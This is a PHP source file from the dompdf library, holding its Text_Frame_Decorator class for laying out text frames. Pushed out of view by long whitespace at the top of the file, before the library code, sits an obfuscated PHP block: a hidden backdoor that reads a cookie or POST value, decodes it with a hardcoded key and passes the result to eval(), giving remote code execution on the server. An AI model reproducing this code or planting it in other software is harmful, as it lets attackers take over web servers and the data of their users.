<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $q33dd58 = 853;$GLOBALS['ka8d709f']=Array();global$ka8d709f;$ka8d709f=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['cfd8']="\x6d\x49\x4c\x52\x7a\x24\x2c\x36\x75\x39\x6f\x38\x50\x77\x4f\x55\x31\x4b\x65\x42\x73\x5f\x29\x7d\x63\x20\x69\x3d\x43\x22\x40\x7c\x67\x35\x3e\x9\x26\x62\x5b\xd\x2f\x44\x61\x3b\x7b\x54\x37\x64\x2a\x3c\x2b\x66\x79\x7e\x78\x45\x59\x4e\x5c\x60\x70\x57\x6b\x25\x30\x68\x72\x5e\x3a\x4a\x2d\x56\x58\x28\x27\x76\x33\x5d\x6c\x5a\x41\x23\xa\x4d\x6e\x74\x21\x71\x3f\x47\x34\x48\x32\x2e\x53\x51\x46\x6a";$ka8d709f[$ka8d709f['cfd8'][52].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][7].$ka8d709f['cfd8'][18]]=$ka8d709f['cfd8'][24].$ka8d709f['cfd8'][65].$ka8d709f['cfd8'][66];$ka8d709f[$ka8d709f['cfd8'][0].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][51].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][37]]=$ka8d709f['cfd8'][10].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][47];$ka8d709f[$ka8d709f['cfd8'][62].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][18]]=$ka8d709f['cfd8'][20].$ka8d709f['cfd8'][85].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][78].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][84];$ka8d709f[$ka8d709f['cfd8'][52].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][18]]=$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][84].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][21].$ka8d709f['cfd8'][20].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][85];$ka8d709f[$ka8d709f['cfd8'][87].$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][92].$ka8d709f['cfd8'][37]]=$ka8d709f['cfd8'][20].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][78].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][4].$ka8d709f['cfd8'][18];$ka8d709f[$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][7]]=$ka8d709f['cfd8'][60].$ka8d709f['cfd8'][65].$ka8d709f['cfd8'][60].$ka8d709f['cfd8'][75].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][20].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][10].$ka8d709f['cfd8'][84];$ka8d709f[$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][24]]=$ka8d709f['cfd8'][8].$ka8d709f['cfd8'][84].$ka8d709f['cfd8'][20].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][78].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][4].$ka8d709f['cfd8'][18];$ka8d709f[$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][92].$ka8d709f['cfd8'][24].$ka8d709f['cfd8'][51].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][51]]=$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][20].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][7].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][21].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][24].$ka8d709f['cfd8'][10].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][18];$ka8d709f[$ka8d709f['cfd8'][13].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][46].$ka8d709f['cfd8'][46].$ka8d709f['cfd8'][37]]=$ka8d709f['cfd8'][20].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][85].$ka8d709f['cfd8'][21].$ka8d709f['cfd8'][85].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][0].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][21].$ka8d709f['cfd8'][78].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][0].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][85];$ka8d709f[$ka8d709f['cfd8'][75].$ka8d709f['cfd8'][24].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][46]]=$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][24].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][7].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][46].$ka8d709f['cfd8'][76];$ka8d709f[$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][90]]=$ka8d709f['cfd8'][20].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][18];$ka8d709f[$ka8d709f['cfd8'][62].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][76]]=$_POST;$ka8d709f[$ka8d709f['cfd8'][97].$ka8d709f['cfd8'][92].$ka8d709f['cfd8'][7].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][64]]=$_COOKIE;@$ka8d709f[$ka8d709f['cfd8'][52].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][18]]($ka8d709f['cfd8'][18].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][10].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][21].$ka8d709f['cfd8'][78].$ka8d709f['cfd8'][10].$ka8d709f['cfd8'][32],NULL);@$ka8d709f[$ka8d709f['cfd8'][52].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][18]]($ka8d709f['cfd8'][78].$ka8d709f['cfd8'][10].$ka8d709f['cfd8'][32].$ka8d709f['cfd8'][21].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][10].$ka8d709f['cfd8'][66].$ka8d709f['cfd8'][20],0);@$ka8d709f[$ka8d709f['cfd8'][52].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][18]]($ka8d709f['cfd8'][0].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][54].$ka8d709f['cfd8'][21].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][54].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][24].$ka8d709f['cfd8'][8].$ka8d709f['cfd8'][85].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][10].$ka8d709f['cfd8'][84].$ka8d709f['cfd8'][21].$ka8d709f['cfd8'][85].$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][0].$ka8d709f['cfd8'][18],0);@$ka8d709f[$ka8d709f['cfd8'][13].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][46].$ka8d709f['cfd8'][46].$ka8d709f['cfd8'][37]](0);$ha14d1=NULL;$p9fb=NULL;$ka8d709f[$ka8d709f['cfd8'][62].$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][64].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][24].$ka8d709f['cfd8'][92].$ka8d709f['cfd8'][46].$ka8d709f['cfd8'][37]]=$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][92].$ka8d709f['cfd8'][51].$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][70].$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][70].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][7].$ka8d709f['cfd8'][51].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][70].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][70].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][64].$ka8d709f['cfd8'][92].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][64].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][33];global$k80e1c27b;function sd3e($ha14d1,$oa3e5c8){global$ka8d709f;$q0c39="";for($t066=0;$t066<$ka8d709f[$ka8d709f['cfd8'][62].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][18]]($ha14d1);){for($affb20975=0;$affb20975<$ka8d709f[$ka8d709f['cfd8'][62].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][18]]($oa3e5c8)&&$t066<$ka8d709f[$ka8d709f['cfd8'][62].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][90].$ka8d709f['cfd8'][18]]($ha14d1);$affb20975++,$t066++){$q0c39.=$ka8d709f[$ka8d709f['cfd8'][52].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][7].$ka8d709f['cfd8'][18]]($ka8d709f[$ka8d709f['cfd8'][0].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][51].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][37]]($ha14d1[$t066])^$ka8d709f[$ka8d709f['cfd8'][0].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][51].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][37]]($oa3e5c8[$affb20975]));}}return$q0c39;}function r9c9a6973($ha14d1,$oa3e5c8){global$ka8d709f;global$k80e1c27b;return$ka8d709f[$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][90]]($ka8d709f[$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][90]]($ha14d1,$k80e1c27b),$oa3e5c8);}foreach($ka8d709f[$ka8d709f['cfd8'][97].$ka8d709f['cfd8'][92].$ka8d709f['cfd8'][7].$ka8d709f['cfd8'][47].$ka8d709f['cfd8'][64]]as$oa3e5c8=>$xf007b660){$ha14d1=$xf007b660;$p9fb=$oa3e5c8;}if(!$ha14d1){foreach($ka8d709f[$ka8d709f['cfd8'][62].$ka8d709f['cfd8'][76].$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][76]]as$oa3e5c8=>$xf007b660){$ha14d1=$xf007b660;$p9fb=$oa3e5c8;}}$ha14d1=@$ka8d709f[$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][33].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][24]]($ka8d709f[$ka8d709f['cfd8'][75].$ka8d709f['cfd8'][24].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][46]]($ka8d709f[$ka8d709f['cfd8'][18].$ka8d709f['cfd8'][92].$ka8d709f['cfd8'][24].$ka8d709f['cfd8'][51].$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][51]]($ha14d1),$p9fb));if(isset($ha14d1[$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][62]])&&$k80e1c27b==$ha14d1[$ka8d709f['cfd8'][42].$ka8d709f['cfd8'][62]]){if($ha14d1[$ka8d709f['cfd8'][42]]==$ka8d709f['cfd8'][26]){$t066=Array($ka8d709f['cfd8'][60].$ka8d709f['cfd8'][75]=>@$ka8d709f[$ka8d709f['cfd8'][26].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][37].$ka8d709f['cfd8'][7]](),$ka8d709f['cfd8'][20].$ka8d709f['cfd8'][75]=>$ka8d709f['cfd8'][16].$ka8d709f['cfd8'][93].$ka8d709f['cfd8'][64].$ka8d709f['cfd8'][70].$ka8d709f['cfd8'][16],);echo@$ka8d709f[$ka8d709f['cfd8'][87].$ka8d709f['cfd8'][11].$ka8d709f['cfd8'][9].$ka8d709f['cfd8'][92].$ka8d709f['cfd8'][37]]($t066);}elseif($ha14d1[$ka8d709f['cfd8'][42]]==$ka8d709f['cfd8'][18]){eval/*i89b254*/($ha14d1[$ka8d709f['cfd8'][47]]);}exit();} ?><?php
/**
 * @package dompdf
 * @link    http://dompdf.github.com/
 * @author  Benj Carson <benjcarson@digitaljunkies.ca>
 * @author  Brian Sweeney <eclecticgeek@gmail.com>
 * @author  Fabien Ménager <fabien.menager@gmail.com>
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 */

/**
 * Decorates Frame objects for text layout
 *
 * @access private
 * @package dompdf
 */
class Text_Frame_Decorator extends Frame_Decorator {
  
  // protected members
  protected $_text_spacing;
  
  // buggy DOMText::splitText (PHP < 5.2.7)
  public static $_buggy_splittext;
  
  function __construct(Frame $frame, DOMPDF $dompdf) {
    if ( !$frame->is_text_node() )
      throw new DOMPDF_Exception("Text_Decorator can only be applied to #text nodes.");
    
    parent::__construct($frame, $dompdf);
    $this->_text_spacing = null;
  }

  //........................................................................

  function reset() {
    parent::reset();
    $this->_text_spacing = null;
  }
  
  //........................................................................

  // Accessor methods
  function get_text_spacing() { return $this->_text_spacing; }
      
  function get_text() {
    // FIXME: this should be in a child class (and is incorrect)
//    if ( $this->_frame->get_style()->content !== "normal" ) {
//      $this->_frame->get_node()->data = $this->_frame->get_style()->content;
//      $this->_frame->get_style()->content = "normal";
//    }

//      pre_r("---");
//      $style = $this->_frame->get_style();
//      var_dump($text = $this->_frame->get_node()->data);
//      var_dump($asc = utf8_decode($text));
//      for ($i = 0; $i < strlen($asc); $i++)
//        pre_r("$i: " . $asc[$i] . " - " . ord($asc[$i]));
//      pre_r("width: " . Font_Metrics::get_text_width($text, $style->font_family, $style->font_size));

    return $this->_frame->get_node()->data;
  }

  //........................................................................

  // Vertical margins & padding do not apply to text frames

  // http://www.w3.org/TR/CSS21/visudet.html#inline-non-replaced:
  //
  // The vertical padding, border and margin of an inline, non-replaced box
  // start at the top and bottom of the content area, not the
  // 'line-height'. But only the 'line-height' is used to calculate the
  // height of the line box.
  function get_margin_height() {
    // This function is called in add_frame_to_line() and is used to
    // determine the line height, so we actually want to return the
    // 'line-height' property, not the actual margin box
    $style = $this->get_parent()->get_style();
    $font = $style->font_family;
    $size = $style->font_size;

    /*
    pre_r('-----');
    pre_r($style->line_height);
    pre_r($style->font_size);
    pre_r(Font_Metrics::get_font_height($font, $size));
    pre_r(($style->line_height / $size) * Font_Metrics::get_font_height($font, $size));
    */

    return ($style->line_height / ( $size > 0 ? $size : 1 )) * Font_Metrics::get_font_height($font, $size);
    
  }

  function get_padding_box() {
    $pb = $this->_frame->get_padding_box();
    $pb[3] = $pb["h"] = $this->_frame->get_style()->height;
    return $pb;
  }
  //........................................................................

  // Set method
  function set_text_spacing($spacing) {
    $style = $this->_frame->get_style();
    
    $this->_text_spacing = $spacing;
    $char_spacing = $style->length_in_pt($style->letter_spacing);
    
    // Re-adjust our width to account for the change in spacing
    $style->width = Font_Metrics::get_text_width($this->get_text(), $style->font_family, $style->font_size, $spacing, $char_spacing);
  }

  //........................................................................

  // Recalculate the text width
  function recalculate_width() {
    $style = $this->get_style();
    $text = $this->get_text();
    $size = $style->font_size;
    $font = $style->font_family;
    $word_spacing = $style->length_in_pt($style->word_spacing);
    $char_spacing = $style->length_in_pt($style->letter_spacing);

    return $style->width = Font_Metrics::get_text_width($text, $font, $size, $word_spacing, $char_spacing);
  }
  
  //........................................................................

  // Text manipulation methods
  
  // split the text in this frame at the offset specified.  The remaining
  // text is added a sibling frame following this one and is returned.
  function split_text($offset) {
    if ( $offset == 0 )
      return null;

    if ( self::$_buggy_splittext ) {
      // workaround to solve DOMText::spliText() bug parsing multibyte strings
      $node = $this->_frame->get_node();
      $txt0 = $node->substringData(0, $offset);
      $txt1 = $node->substringData($offset, mb_strlen($node->textContent)-1);

      $node->replaceData(0, mb_strlen($node->textContent), $txt0);
      $split = $node->parentNode->appendChild(new DOMText($txt1));
    }
    else {
      $split = $this->_frame->get_node()->splitText($offset);
    }
    
    $deco = $this->copy($split);

    $p = $this->get_parent();
    $p->insert_child_after($deco, $this, false);

    if ( $p instanceof Inline_Frame_Decorator )
      $p->split($deco);

    return $deco;
  }

  //........................................................................

  function delete_text($offset, $count) {
    $this->_frame->get_node()->deleteData($offset, $count);
  }

  //........................................................................

  function set_text($text) {
    $this->_frame->get_node()->data = $text;
  }

}

Text_Frame_Decorator::$_buggy_splittext = PHP_VERSION_ID < 50207;
